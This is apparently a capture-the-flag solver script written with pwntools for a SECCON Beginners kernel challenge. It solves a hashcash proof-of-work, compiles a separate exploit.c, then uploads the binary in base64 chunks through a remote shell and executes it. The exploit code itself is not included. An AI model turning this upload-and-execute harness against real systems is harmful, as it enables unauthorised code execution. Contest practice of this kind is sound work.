from pwn import *

import os

is_gaibu = True
if is_gaibu:
    r = remote("kbuf.beginners.seccon.games", 9999)
    s = r.recvline().strip(b"\n").split(b" ")
    s[0] = b"hashcash"
    print(s)
    result = subprocess.run(s, capture_output=True, text=True)
    r.sendline(result.stdout.split(" ")[-1])
else:
    r = remote("localhost", 3001)

os.system("rm -f exploit_small.gz && musl-gcc exploit.c -o ./exploit_small --static -g -Os -s -masm=intel &&  gzip exploit_small && base64 exploit_small.gz > exploit_small.gz.b64")

with open("exploit_small.gz.b64", "rb") as f:
    binary = f.read().decode("ascii")

def exploit():
  progress = 0
  N = 0x300
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    print('echo -n "{}" >> exploit.gz.b64'.format(s))
    r.sendlineafter(b'/tmp $', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if progress % N == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  r.sendlineafter(b'$', b'base64 -d exploit.gz.b64 > exploit.gz')
  r.sendlineafter(b'$', b'gunzip ./exploit.gz')

  r.sendlineafter(b'$', b'chmod +x ./exploit')
  r.sendlineafter(b'$', b'./exploit')

r.recvuntil(b"$")
r.sendline(b"cd /tmp")

exploit()


r.interactive()
